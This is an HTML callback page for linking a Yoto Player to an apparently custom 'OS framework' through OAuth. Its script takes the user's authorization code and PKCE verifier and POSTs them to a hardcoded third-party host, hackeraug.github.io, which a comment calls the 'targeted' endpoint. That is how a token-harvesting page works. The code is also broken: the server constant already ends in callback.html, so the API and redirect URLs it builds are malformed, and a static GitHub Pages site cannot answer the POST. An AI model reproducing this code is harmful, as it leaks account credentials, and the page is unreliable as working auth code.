<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting your Yoto...</title>
    <style>
        body { font-family: system-ui, sans-serif; text-align: center; padding: 50px; background: #f9f9f9; color: #4a5568; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff6b35; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error { color: #d9381e; display: none; background: #fff5f5; padding: 20px; border-radius: 8px; border: 1px solid #fed7d7; max-width: 500px; margin: 20px auto; }
    </style>
</head>
<body>
    <div id="status-container">
        <h2>🔒 Securing your connection...</h2>
        <p>Linking your Yoto Player to the custom OS framework.</p>
        <div class="loader"></div>
    </div>

    <div id="error-message" class="error">
        <h2>⚠️ Connection Failed</h2>
        <p id="error-text">Could not communicate with the server.</p>
        <a href="index.html" style="color: #ff6b35; font-weight: bold; text-decoration: none;">Return to Home</a>
    </div>

    <script>
        // HARDCODED DESTINATION FOR HANDSHAKE DELIVERY
        const TARGET_SERVER = "https://hackeraug.github.io/Yoto-multi-card/callback.html";

        async function completeAuthentication() {
            const urlParams = new URLSearchParams(window.location.search);
            const authCode = urlParams.get('code');
            const savedVerifier = sessionStorage.getItem('yoto_pkce_verifier');

            if (!authCode) {
                showError("No authorization credentials returned from Yoto gateway.");
                return;
            }

            try {
                // Forwarding tokens directly to the targeted web node service endpoint
                const response = await fetch(`${TARGET_SERVER}/api/yoto/callback`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        authCode: authCode,
                        codeVerifier: savedVerifier,
                        redirectUri: `${TARGET_SERVER}/callback.html`
                    })
                });

                const data = await response.json();

                if (response.ok && data.success) {
                    localStorage.setItem('yoto_player_id', data.playerId);
                    window.location.href = 'index.html?connected=true';
                } else {
                    showError(data.error || "The cloud server rejected the credentials.");
                }
            } catch (error) {
                showError("Failed to establish secure contact with your backend engine.");
            }
        }

        function showError(message) {
            document.getElementById('status-container').style.display = 'none';
            document.getElementById('error-message').style.display = 'block';
            document.getElementById('error-text').innerText = message;
        }

        completeAuthentication();
    </script>
</body>
</html>
